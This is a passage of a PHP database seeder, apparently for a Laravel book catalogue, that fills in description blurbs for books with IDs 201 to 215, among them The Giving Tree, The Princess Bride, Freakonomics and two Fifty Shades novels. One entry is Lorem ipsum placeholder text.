\nIn Jurassic Park, Michael Crichton taps all his mesmerizing talent and scientific brilliance to create his most electrifying technothriller.";
        $book->save();

        $book = Book::find(201);
        $book->description = "\"Once there was a tree...and she loved a little boy.\"
\nSo begins a story of unforgettable perception, beautifully written and illustrated by the gifted and versatile Shel Silverstein.
\nEvery day the boy would come to the tree to eat her apples, swing from her branches, or slide down her trunk...and the tree was happy. But as the boy grew older he began to want more from the tree, and the tree gave and gave and gave.
\nThis is a tender story, touched with sadness, aglow with consolation. Shel Silverstein has created a moving parable for readers of all ages that offers an affecting interpretation of the gift of giving and a serene acceptance of another's capacity to love in return.";
        $book->save();

        $book = Book::find(202);
        $book->description = "Before The Firm and The Pelican Brief made him a superstar, John Grisham wrote this riveting story of retribution and justice. In this searing courtroom drama, best-selling author John Grisham probes the savage depths of racial violence...as he delivers a compelling tale of uncertain justice in a small southern town...Clanton, Mississippi.
\nThe life of a ten-year-old girl is shattered by two drunken and remorseless young men. The mostly white town reacts with shock and horror at the inhuman crime. Until her black father acquires an assault rifle and takes matters into his hands.
\nFor ten days, as burning crosses and the crack of sniper fire spread through the streets of Clanton, the nation sits spellbound as young defense attorney Jake Brigance struggles to save his client's life...and then his own.";
        $book->save();

        $book = Book::find(203);
        $book->description = "
Lorem ipsum dolor sit amet, consectetur adipisicing elit. Accusantium architecto consectetur ducimus eius expedita, maxime minima molestias nostrum officia omnis quae qui quidem quo reiciendis rem ullam unde ut vero.
Lorem ipsum dolor sit amet, consectetur adipisicing elit. A alias, aliquam consequuntur culpa debitis dicta ea enim est ex exercitationem impedit ipsam itaque, magni officiis quas, quo sit ullam unde?";
        $book->save();

        $book = Book::find(204);
        $book->description = "Who is the real Margo?
\nQuentin Jacobsen has spent a lifetime loving the magnificently adventurous Margo Roth Spiegelman from afar. So when she cracks open a window and climbs into his life—dressed like a ninja and summoning him for an ingenious campaign of revenge—he follows. After their all-nighter ends, and a new day breaks, Q arrives at school to discover that Margo, always an enigma, has now become a mystery. But Q soon learns that there are clues—and they're for him. Urged down a disconnected path, the closer he gets, the less Q sees the girl he thought he knew...";
        $book->save();

        $book = Book::find(205);
        $book->description = "What happens when the most beautiful girl in the world marries the handsomest prince of all time and he turns out to be...well...a lot less than the man of her dreams?
\nAs a boy, William Goldman claims, he loved to hear his father read the S. Morgenstern classic, The Princess Bride. But as a grown-up he discovered that the boring parts were left out of good old Dad's recitation, and only the \"good parts\" reached his ears.
\nNow Goldman does Dad one better. He's reconstructed the \"Good Parts Version\" to delight wise kids and wide-eyed grownups everywhere.
\nWhat's it about? Fencing. Fighting. True Love. Strong Hate. Harsh Revenge. A Few Giants. Lots of Bad Men. Lots of Good Men. Five or Six Beautiful Women. Beasties Monstrous and Gentle. Some Swell Escapes and Captures. Death, Lies, Truth, Miracles, and a Little Sex.
\nIn short, it's about everything.";
        $book->save();

        $book = Book::find(206);
        $book->description = "The Outsiders is about two weeks in the life of a 14-year-old boy. The novel tells the story of Ponyboy Curtis and his struggles with right and wrong in a society in which he believes that he is an outsider. According to Ponyboy, there are two kinds of people in the world: greasers and socs. A soc (short for \"social\") has money, can get away with just about anything, and has an attitude longer than a limousine. A greaser, on the other hand, always lives on the outside and needs to watch his back. Ponyboy is a greaser, and he's always been proud of it, even willing to rumble against a gang of socs for the sake of his fellow greasers--until one terrible night when his friend Johnny kills a soc. The murder gets under Ponyboy's skin, causing his bifurcated world to crumble and teaching him that pain feels the same whether a soc or a greaser.";
        $book->save();

        $book = Book::find(207);
        $book->description = "If you ain’t scared, you ain’t human.
\nWhen Thomas wakes up in the lift, the only thing he can remember is his name. He’s surrounded by strangers—boys whose memories are also gone.
\nNice to meet ya, shank. Welcome to the Glade.
\nOutside the towering stone walls that surround the Glade is a limitless, ever-changing maze. It’s the only way out—and no one’s ever made it through alive.
\nEverything is going to change.
\nThen a girl arrives. The first girl ever. And the message she delivers is terrifying.
\nRemember. Survive. Run.";
        $book->save();

        $book = Book::find(208);
        $book->description = "Which is more dangerous, a gun or a swimming pool? What do schoolteachers and sumo wrestlers have in common? Why do drug dealers still live with their moms? How much do parents really matter? What kind of impact did Roe v. Wade have on violent crime? Freakonomics will literally redefine the way we view the modern world.
\nThese may not sound like typical questions for an economist to ask. But Steven D. Levitt is not a typical economist. He is a much heralded scholar who studies the stuff and riddles of everyday life -- from cheating and crime to sports and child rearing -- and whose conclusions regularly turn the conventional wisdom on its head. He usually begins with a mountain of data and a simple, unasked question. Some of these questions concern life-and-death issues; others have an admittedly freakish quality. Thus the new field of study contained in this book: freakonomics.
\nThrough forceful storytelling and wry insight, Levitt and co-author Stephen J. Dubner show that economics is, at root, the study of incentives -- how people get what they want, or need, especially when other people want or need the same thing. In Freakonomics, they set out to explore the hidden side of ... well, everything. The inner workings of a crack gang. The truth about real-estate agents. The myths of campaign finance. The telltale marks of a cheating schoolteacher. The secrets of the Ku Klux Klan.
\nWhat unites all these stories is a belief that the modern world, despite a surfeit of obfuscation, complication, and downright deceit, is not impenetrable, is not unknowable, and -- if the right questions are asked -- is even more intriguing than we think. All it takes is a new way of looking. Steven Levitt, through devilishly clever and clear-eyed thinking, shows how to see through all the clutter.
\nFreakonomics establishes this unconventional premise: If morality represents how we would like the world to work, then economics represents how it actually does work. It is true that readers of this book will be armed with enough riddles and stories to last a thousand cocktail parties. But Freakonomics can provide more than that. It will literally redefine the way we view the modern world.";
        $book->save();

        $book = Book::find(209);
        $book->description = "\"One of the most delightful and enduring classics of children's literature, The Secret Garden by Victorian author Frances Hodgson Burnett has remained a firm favorite with children the world over ever since it made its first appearance. Initially published as a serial story in 1910 in The American Magazine, it was brought out in novel form in 1911.
\nThe plot centers round Mary Lennox, a young English girl who returns to England from India, having suffered the immense trauma by losing both her parents in a cholera epidemic. However, her memories of her parents are not pleasant, as they were a selfish, neglectful and pleasure-seeking couple. Mary is given to the care of her uncle Archibald Craven, whom she has never met. She travels to his home, Misselthwaite Manor located in the gloomy Yorkshire, a vast change from the sunny and warm climate she was used to. When she arrives, she is a rude, stubborn and given to stormy temper tantrums. However, her nature undergoes a gradual transformation when she learns of the tragedies that have befallen her strict and disciplinarian uncle whom she earlier feared and despised. Once when he's away from home, Mary discovers a charming walled garden which is always kept locked. The mystery deepens when she hears sounds of sobbing from somewhere within her uncle's vast mansion. The kindly servants ignore her queries or pretend they haven't heard, spiking Mary's curiosity.
\nThe Secret Garden appeals to both young and old alike. It has wonderful elements of mystery, spirituality, charming characters and an authentic rendering of childhood emotions and experiences. Commonsense, truth and kindness, compassion and a belief in the essential goodness of human beings lie at the heart of this unforgettable story. It is the best known of Frances Hodgson Burnett's works, though most of us have definitely heard of, if not read, her other novel Little Lord Fauntleroy. \"";
        $book->save();

        $book = Book::find(210);
        $book->description = "Cien años de soledad CD FRAGMENTOS. La historia se centra en la familia Buendía, durante seis generaciones, desde José Arcadio Buendía y su mujer Úrsula, pertenecientes a una de las familias fundadoras del pueblo donde se desarrolla la trama-Macondo- hasta la sexta, Aureliano Babilonia. Se encuentra enmarcada en el principio del Siglo XX y se puede apreciar la guerra entre liberales y conservadores en la que se ve envuelto el Coronel Aureliano Buendía, perteneciente a la segunda generación, así como la llegada de los americanos a Macondo que instalan una bananera.";
        $book->save();

        $book = Book::find(211);
        $book->description = "Written in his distinctively dazzling manner, Oscar Wilde’s story of a fashionable young man who sells his soul for eternal youth and beauty is the author’s most popular work. The tale of Dorian Gray’s moral disintegration caused a scandal when it ﬁrst appeared in 1890, but though Wilde was attacked for the novel’s corrupting inﬂuence, he responded that there is, in fact, “a terrible moral in Dorian Gray.” Just a few years later, the book and the aesthetic/moral dilemma it presented became issues in the trials occasioned by Wilde’s homosexual liaisons, which resulted in his imprisonment. Of Dorian Gray’s relationship to autobiography, Wilde noted in a letter, “Basil Hallward is what I think I am: Lord Henry what the world thinks me: Dorian what I would like to be—in other ages, perhaps.";
        $book->save();

        $book = Book::find(212);
        $book->description = "When unworldly student Anastasia Steele first encountered the driven and dazzling young entrepreneur Christian Grey it sparked a sensual affair that changed both of their lives irrevocably. Shocked, intrigued, and, ultimately, repelled by Christian’s singular erotic tastes, Ana demands a deeper commitment. Determined to keep her, Christian agrees.
\nNow, Ana and Christian have it all—love, passion, intimacy, wealth, and a world of possibilities for their future. But Ana knows that loving her Fifty Shades will not be easy, and that being together will pose challenges that neither of them would anticipate. Ana must somehow learn to share Christian’s opulent lifestyle without sacrificing her own identity. And Christian must overcome his compulsion to control as he wrestles with the demons of a tormented past.

Just when it seems that their strength together will eclipse any obstacle, misfortune, malice, and fate conspire to make Ana’s deepest fears turn to reality.";
        $book->save();

        $book = Book::find(213);
        $book->description = "A rich selection of background and source materials is provided in three areas: Contexts includes probable inspirations for Dracula in the earlier works of James Malcolm Rymer and Emily Gerard. Also included are a discussion of Stoker's working notes for the novel and \"Dracula's Guest,\" the original opening chapter to Dracula. Reviews and Reactions reprints five early reviews of the novel. \"Dramatic and Film Variations\" focuses on theater and film adaptations of Dracula, two indications of the novel's unwavering appeal. David J. Skal, Gregory A. Waller, and Nina Auerbach offer their varied perspectives. Checklists of both dramatic and film adaptations are included.
\nCriticism collects seven theoretical interpretations of Dracula by Phyllis A. Roth, Carol A. Senf, Franco Moretti, Christopher Craft, Bram Dijkstra, Stephen D. Arata, and Talia Schaffer.";
        $book->save();

        $book = Book::find(214);
        $book->description = "Utsedd till årets bästa deckare på svenska av Svenska Deckarakademin
\nI uppföljaren till Män som hatar kvinnor är det Lisbeth Salander som står i centrum. Hon blir anklagad för trippelmord och dras in i en härva som leder tillbaka till hennes mörka förflutna.
\nLisbeth Salander återkommer till Sverige efter en längre tids vistelse utomlands. Tack vare finansmannen Wennerströms pengar har hon det bättre ställt än någonsin, men hon återvänder till ett Stockholm där hon inte längre har familj eller vänner. Lisbeth är helt ensam i världen. En rad dramatiska händelser inträffar som får Lisbeths mörka förflutna att göra sig påmint, och när hon dras in i en mördarjakt där hon själv är villebråd bestämmer hon sig för att göra upp med det förgångna en gång för alla. Hon ska straffa dem som förtjänar att straffas.
\nSamtidigt har Mikael Blomkvist på Millennium fått korn på hett nyhetsstoff. Journalisten Dag Svensson och hans sambo Mia Bergman kan visa avslöjande fakta om en omfattande sexhandel mellan Östeuropa och Sverige. Många av de personer som utpekas i traffickinghärvan har högt uppsatta positioner i samhället.
När Dag och Mia blir brutalt mördade och misstankarna riktas mot Salander bestämmer sig Mikael Blomkvist för att driva sin egen utredning. Han upptäcker snart ett samband mellan morden och traffickingtemat. Den fruktade Zala, vars namn ständigt förekommer i utredningen, visar sig dessutom ha kopplingar till en viss Lisbeth Salander...
Det är dags för Blomkvist och Salander att mötas igen.";
        $book->save();

        $book = Book::find(215);
        $book->description = "Daunted by the singular sexual tastes and dark secrets of the beautiful, tormented young entrepreneur Christian Grey, Anastasia Steele has broken off their relationship to start a new career with a Seattle publishing house. But desire for Christian still dominates her every waking thought, and when he proposes a new arrangement, Anastasia cannot resist. They rekindle their searing sensual affair, and Anastasia learns more about the harrowing past of her damaged, driven, and demanding Fifty Shades. While Christian wrestles with his inner demons, Anastasia must confront her anger and envy of the women who came before her and make the most important decision of her life. Erotic, sparkling and suspenseful, Fifty Shades Darker is the irresistibly addictive second part of the Fifty Shades trilogy.";
        $book->save();

        echo "Done";
    }
}
